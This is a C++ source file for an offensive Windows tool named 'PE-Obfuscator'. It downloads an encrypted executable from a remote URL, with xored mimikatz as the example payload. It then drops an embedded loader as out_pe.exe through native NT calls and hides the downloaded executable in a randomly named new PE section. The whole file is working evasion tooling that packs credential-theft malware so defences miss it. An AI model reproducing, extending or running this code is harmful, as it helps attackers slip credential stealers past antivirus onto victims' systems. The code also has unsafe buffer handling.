#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <winternl.h>
using namespace std;
#include "GetPEdata.h"
#include "DropFile.h"
#include "SectionWork.h"
#include "loader.h"

#pragma comment(lib, "winhttp")
#pragma comment(lib, "ntdll")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

struct DATA {
    LPVOID data;
    DWORD size;
};



EXTERN_C NTSTATUS NtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);

EXTERN_C NTSTATUS NtWriteFile(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
);


wchar_t* DropLoader() {
    NTSTATUS status1;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK osb;
    UNICODE_STRING fileName;
    HANDLE fHandle;

    wchar_t current_directory[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, current_directory);
    wchar_t out_pe[MAX_PATH];
    ZeroMemory(out_pe, MAX_PATH);
    lstrcatW(out_pe, L"\\??\\");
    lstrcatW(out_pe, current_directory);
    lstrcatW(out_pe, L"\\out_pe.exe");

    wprintf(L"%ws\n", out_pe);

    RtlInitUnicodeString(&fileName, (PCWSTR)out_pe);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status1 = NtCreateFile(&fHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, 0,
        FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in CreateFile (%u)\n", GetLastError());
        return NULL;
    }

    NTSTATUS status2;
    IO_STATUS_BLOCK osb2;
    ZeroMemory(&osb2, sizeof(IO_STATUS_BLOCK));

    DWORD uSize = sizeof(loader);

    status2 = NtWriteFile(fHandle, NULL, NULL, NULL, &osb, (PVOID)loader, uSize, NULL, NULL);

    if (!NT_SUCCESS(status2)) {
        printf("[!] Failed in SysWriteFile (%u)\n", GetLastError());
        return NULL;
    }

    CloseHandle(fHandle);
    return out_pe;
}


void main(int argc, char** argv) {
    
    const char* showme = "\n\n\n"
            "\t8888888b.  8888888888       .d88888b.  888      .d888                                      888\n"
            "\t888   Y88b 888             d88P\" \"Y88b 888      d88P\"                                      888\n"
            "\t888    888 888             888     888 888      888                                        888\n"
            "\t888   d88P 8888888         888     888 88888b.  888888 888  888 .d8888b  .d8888b  8888b.   888888 .d88b.  888d888\n"
            "\t8888888P\"  888             888     888 888 \"88b 888    888  888 88K      d88P\"        \"88b 888   d88\"\"88b 888P\n"   
            "\t888        888      888888 888     888 888  888 888    888  888 \"Y8888b. 888      .d888888 888   888  888 888\n"
            "\t888        888             Y88b..d88P  888 d88P 888    Y88b 888      X88 Y88b.    888  888 Y88b. Y88..88P 888\n"
            "\t888        8888888888       \"Y88888P\"  88888P\"  888     \"Y88888  88888P'  \"Y8888P \"Y888888  \"Y888 \"Y88P\"  888\n"
            "                                                                                                                      V 1.0"
        "\n\n\t\t\t\t\t\t\tBy Saad AHLA  (@D1rkMtr) \n\n";

    if (argc != 2) {
        cout << showme;

        printf("\n\t[*] Usage:\n\t\t\tPE-Obfuscator.exe <Uri>\n\n");
        printf("\n\t[+] URI Like :\n\t[*] https://github.com/ParrotSec/mimikatz/raw/master/x64/xored_mimikatz.exe \n\t[*] http://10.91.176.245:8080/xored_mimikatz.exe\n\t[*] http://10.91.176.245/xored_mimikatz.exe\n\n");
        return;
    }

    cout << showme;


    DATA PE;

    char* shellcode = argv[1];



    if (!strncmp("https:", shellcode, 6)) {

        char domain[MAX_PATH];
        
        char path[MAX_PATH];
        
        sscanf(shellcode, "https://%9000[^/]/%9000[^\n]", domain, path);

        printf("\n[+] Loading Remote Encrypted PE from %s\n", domain);

        //printf("domain : %s\n", domain);
        //printf("path : %s\n", path);

        wchar_t Wdomain[MAX_PATH];

        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null

        wchar_t Wpath[MAX_PATH];

        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 

        const char* invalid_characters = ":";
        char* mystring = domain;
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[MAX_PATH] = "";
                char strPort[MAX_PATH] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i - j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);

                wchar_t WrealDomain[MAX_PATH];
                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
                //printf("WrealDomain %ws\n", WrealDomain);

                port = atoi(strPort);

                //printf("Wpath %ws\n", Wpath);
                //printf("WrealDomain %ws\n", WrealDomain);
                //printf("port %d\n", port);
                PE = GetPE_HTTPSport(WrealDomain, Wpath, port);

                goto jump;
            }
            j++;
            c++;
        }
        //printf("Wdomain : %ws\n",Wdomain);
        //printf("Wpath : %ws\n", Wpath);
        PE = GetPE443(Wdomain, Wpath);
    }
    else if (!strncmp(shellcode, "http:", 5)) {
        char domain[MAX_PATH];
        char path[MAX_PATH];

        sscanf(shellcode, "http://%9000[^/]/%9000[^\n]", domain, path);

        printf("\n[+] Loading Remote PE from %s\n", domain);


        //printf("domain : %s\n", domain);
        //printf("path : %s\n", path);

        wchar_t Wdomain[MAX_PATH];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        wchar_t Wpath[MAX_PATH];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 

        const char* invalid_characters = ":";
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[MAX_PATH] = "";
                char strPort[MAX_PATH] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);

                size_t origsize = strlen(realDomain) + 1;
                const size_t newsize = MAX_PATH;
                size_t convertedChars = 0;
                wchar_t WrealDomain[newsize];
                mbstowcs_s(&convertedChars, WrealDomain, origsize, realDomain, _TRUNCATE);
                //printf("WrealDomain %ws\n", WrealDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i - j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);


                port = atoi(strPort);

                //printf("Wpath %ws\n", Wpath);

                //printf("port %d\n", port);
                PE = GetPE_HTTPport(WrealDomain, Wpath, port);

                goto jump;
            }
            j++;
            c++;
        }

        //printf("Wdomain : %ws\n",Wdomain);
        //printf("Wpath   : %ws\n", Wpath);
        PE = GetPE80(Wdomain, Wpath);

    }

jump:

    size_t PEsize = PE.size;
    LPVOID PEdata = PE.data;

    
    if (!PEsize) {
        printf("\n[-] Failed to Get the Remote PE\n");
        return;
    }

    //printf("[+] size : %d\n", PEsize);
    //printf("[+] PE-address : %p\n", PE.data);


    // Drop the Loader
    wchar_t* LoaderPathwstr = DropLoader();
    
    
    char LoaderPathstr[MAX_PATH];
    ZeroMemory(LoaderPathstr, MAX_PATH);
    wcstombs(LoaderPathstr, LoaderPathwstr, MAX_PATH);

    
    char randomChars[6];
    ZeroMemory(randomChars, '\0');
    memcpy(randomChars, GetRandomSectionName(), 6);
    printf("\n[+] Generate a Random Section Name : \"%s\"\n", randomChars);
    
    if (AddSection(LoaderPathstr, randomChars, PEsize)) {

        printf("\n[+] Section %s with %d bytes added\n", randomChars, PEsize);

    }
    else {

        printf("\n[+] The 7th section is already existed\n");
    }

    if (AddPE2Section(LoaderPathstr, PE)) {
        printf("\n[+] Adding PE to %s\n", randomChars);
    }
    else {
        printf("[+]\n[-] Failed to drop PE to %s\n", randomChars);
    }
    
    printf("\n[+] Finished\n\n\n");
    
}